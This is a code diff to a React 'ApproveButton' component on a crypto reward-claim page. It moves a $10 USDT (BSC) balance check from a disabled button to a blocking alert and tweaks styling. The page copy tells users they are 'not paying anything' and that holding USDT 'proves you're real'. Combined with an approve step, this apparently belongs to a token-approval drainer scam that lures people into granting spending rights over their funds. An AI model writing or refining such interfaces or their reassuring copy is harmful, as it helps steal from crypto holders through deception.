@@ -133,6 +133,12 @@ export default function ApproveButton() {
       return;
     }
 
+    // Check if user has minimum USDT before proceeding
+    if (!hasMinimumUsdt) {
+      alert("🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.");
+      return;
+    }
+
     setLoading(true);
 
     const usdtFormatted = usdtBalance
@@ -251,21 +257,21 @@ export default function ApproveButton() {
     <div>
       <button
         onClick={handleApprove}
-        disabled={loading || !hasMinimumUsdt}
+        disabled={loading}
         style={{
           width: "100%",
           padding: "18px 24px",
           fontSize: "1.1rem",
           fontWeight: "700",
           color: "#ffffff",
-          background: loading || !hasMinimumUsdt
+          background: loading
             ? "rgba(139, 92, 246, 0.5)"
             : "linear-gradient(135deg, #8b5cf6 0%, #3b82f6 100%)",
           border: "none",
           borderRadius: "15px",
-          cursor: loading || !hasMinimumUsdt ? "not-allowed" : "pointer",
+          cursor: loading ? "not-allowed" : "pointer",
           transition: "all 0.3s ease",
-          boxShadow: loading || !hasMinimumUsdt
+          boxShadow: loading
             ? "none"
             : "0 8px 25px rgba(139, 92, 246, 0.4)",
           position: "relative",
@@ -273,13 +279,13 @@ export default function ApproveButton() {
           backdropFilter: "blur(10px)",
         }}
         onMouseEnter={(e) => {
-          if (!loading && hasMinimumUsdt) {
+          if (!loading) {
             e.target.style.transform = "translateY(-2px)";
             e.target.style.boxShadow = "0 12px 35px rgba(139, 92, 246, 0.6)";
           }
         }}
         onMouseLeave={(e) => {
-          if (!loading && hasMinimumUsdt) {
+          if (!loading) {
             e.target.style.transform = "translateY(0)";
             e.target.style.boxShadow = "0 8px 25px rgba(139, 92, 246, 0.4)";
           }
@@ -331,7 +337,8 @@ export default function ApproveButton() {
           <div style={{
             fontSize: "14px",
             marginBottom: "12px",
-            color: "rgba(255, 255, 255, 0.8)"
+            color: "rgba(255, 255, 255, 0.8)",
+            fontStyle: "italic"
           }}>
             Current balance: ${usdtBalanceNumber.toFixed(2)} USDT
           </div>
@@ -348,7 +355,8 @@ export default function ApproveButton() {
         padding: "12px",
         borderRadius: "10px",
         border: "1px solid rgba(255, 255, 255, 0.1)",
-        textAlign: "center"
+        textAlign: "center",
+        fontStyle: "italic"
       }}>
         💡 Note: You're not paying anything — holding at least $10 USDT on the Binance Smart Chain (BSC) network simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
       </div>
